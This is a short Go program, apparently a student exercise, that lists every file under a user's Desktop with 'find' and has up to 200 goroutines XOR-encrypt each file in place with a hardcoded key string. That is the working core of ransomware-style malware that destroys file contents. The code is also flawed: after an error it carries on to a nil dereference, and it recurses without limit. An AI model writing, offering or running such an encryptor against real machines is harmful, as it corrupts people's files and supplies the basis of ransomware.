package main

import (
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"strings"
	"sync"
)

var wg sync.WaitGroup
var wgc sync.WaitGroup

var Xorstring = "salut_je_suis_la_phrase_qui_xor_cette_save_je_suis_tres_long_cest_normal_salut_les_mentor_je_suis_un_xor"

func Crypt(filename string, ch chan string) {
	file, _ := os.Open(filename)
	fileInfo, err := os.Stat(filename)
	if err != nil {
		fmt.Println(err)
		wgc.Done()
		fmt.Println("fail " + filename)
		Crypt(<-ch, ch)
	}
	if fileInfo.Size() > 200000000 {
		wgc.Done()
		fmt.Println("too big " + filename)
		Crypt(<-ch, ch)
	}
	arr := make([]byte, fileInfo.Size())
	_, _ = file.Read(arr)
	file = nil
	var xor []byte
	for i := 0; i < len(arr); i++ {
		xor = append(xor, arr[i]^Xorstring[i%len(Xorstring)])
	}
	arr = nil
	_ = ioutil.WriteFile(filename, xor, 0644)
	xor = nil
	wgc.Done()
	fmt.Println("fini")
	Crypt(<-ch, ch)
}

func main() {
	cmd := exec.Command("bash", "-c", "find /home/tomfox/Desktop -type f")
	output, _ := cmd.CombinedOutput()
	listfile := strings.Split(string(output), "\n")
	ch := make(chan string, len(listfile))
	for _, file := range listfile {
		wg.Add(1)
		wgc.Add(1)
		go func(file string) {
			ch <- file
			wg.Done()
		}(file)
	}
	wg.Wait()
	<-ch
	wgc.Done()
	for i := 0; i < 200; i++ {
		if len(ch) == 0 {
			break
		}
		go Crypt(<-ch, ch)
	}
	wgc.Wait()
}
